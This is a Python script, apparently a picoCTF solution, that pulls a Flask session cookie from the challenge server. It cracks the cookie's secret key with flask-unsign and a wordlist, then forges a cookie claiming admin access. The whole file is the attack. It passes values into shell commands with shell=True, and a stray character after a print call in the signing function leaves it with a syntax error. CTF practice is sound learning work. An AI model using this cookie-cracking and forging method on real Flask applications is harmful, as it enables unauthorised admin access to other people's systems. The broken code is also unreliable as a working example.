import requests
import importlib
import subprocess
import json


session = requests.Session()
response = session.get('http://mercury.picoctf.net:6259/')
def jwt():
    jwt = session.cookies.get_dict().get('session')
    print("getting cookie")
    print("JWT:", jwt)
    return jwt

## Check if flask-unsign is installed

def check_flask_unsign():
    status = False
    try:
        importlib.import_module('flask_unsign')
        print("Flask-Unsign is installed.")
        status = True
        return status
    except ImportError:
        print("Flask-Unsign is not installed. Installing...")
        try:
            subprocess.run(['pip', 'install', 'Flask-Unsign[wordlist]'])
            print("Flask-Unsign has been installed.")
            status = True
            return status
        except Exception as e:
            print("Flask-Unsign installation failed.", str(e))
            status = False
            return status

def unsign_jwt(jwt):
    flask_unsign_cmd = f'flask-unsign --unsign --cookie {jwt} -w cookie.txt'
    secret_key = ''
    try:
        result = subprocess.run(flask_unsign_cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print("JWT successfully unsign")
            print("found secret key")
            print("Secret key:", result.stdout.strip())
            secret_key=result.stdout.strip()
            return secret_key
        else:
            print("Failed to unsign JWT:", result.stderr)
    except Exception as e:
        print("Error during unsigning JWT:", str(e))

def sign_jwt(secret_key):
    cookie = {'very_auth': 'admin'}
    cookie_json = json.dumps(cookie)
    flask_sign_cmd = f'flask-unsign --sign --cookie \'{cookie_json}\' --secret "{secret_key}"'
    try:
        result = subprocess.run(flask_sign_cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print("JWT successfully signed")
            print("Signed JWT:", result.stdout.strip())
            sign_jwt = result.stdout.strip()
            return sign_jwt
        else:
            print("Failed to sign JWT:", result.stderr) v
            return None
    except Exception as e:
        print("Error during signing JWT:", str(e))
        return None

def main():
    # main code here
    check_flask_unsign()
    jwt_token = jwt()
    secret_key=unsign_jwt(jwt_token)
    resigned_jwt = sign_jwt(secret_key)
if __name__ == '__main__':
    main()
